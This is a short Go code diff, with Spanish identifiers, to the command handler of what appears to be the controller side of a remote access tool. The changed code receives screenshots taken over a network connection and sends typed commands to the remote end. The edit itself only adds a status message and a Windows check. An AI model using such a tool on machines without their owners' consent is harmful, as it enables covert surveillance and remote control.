@@ -104,14 +104,16 @@ func Comando(conexiones net.Conn) error {
 		conexiones.Close()
 		os.Exit(0)
 	case "ss":
+		fmt.Println(color.Violeta + "[*] esperando la imagen ..." + color.Reset)
 		byte_img, error := ss.Obtener_img(conexiones)
 		if error != nil {
 			return errors.New("[!] error al obtener la imagen")
 		}
 		nombre := input.Input("[*] nombre del png (sin extension)>> ")
 		ss.Escribir_img(byte_img, nombre)
-		exec.Command("powershell", "-command", "start", fmt.Sprintf("%s.png", nombre)).Run()
-
+		if runtime.GOOS == "windows" {
+			exec.Command("powershell", "-command", "start", fmt.Sprintf("%s.png", nombre)).Run()
+		}
 	default:
 		err := envio(conexiones, entrada)
 		if err != nil {
